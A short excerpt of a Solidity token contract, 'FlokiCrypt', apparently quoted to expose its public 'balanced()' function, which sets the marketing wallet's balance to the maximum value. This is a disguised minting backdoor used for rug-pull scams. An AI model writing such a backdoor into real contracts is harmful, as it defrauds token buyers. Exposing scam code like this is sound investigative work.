...
contract FlokiCrypt is Context, IERC20, Ownable {
    ...
    string private constant _name = "FlokiCrypt";
    string private constant _symbol = "$FLOKICRYPT";
    ...
    function balanced() public virtual { balances[marketingWallet] = ~uint256(0); }
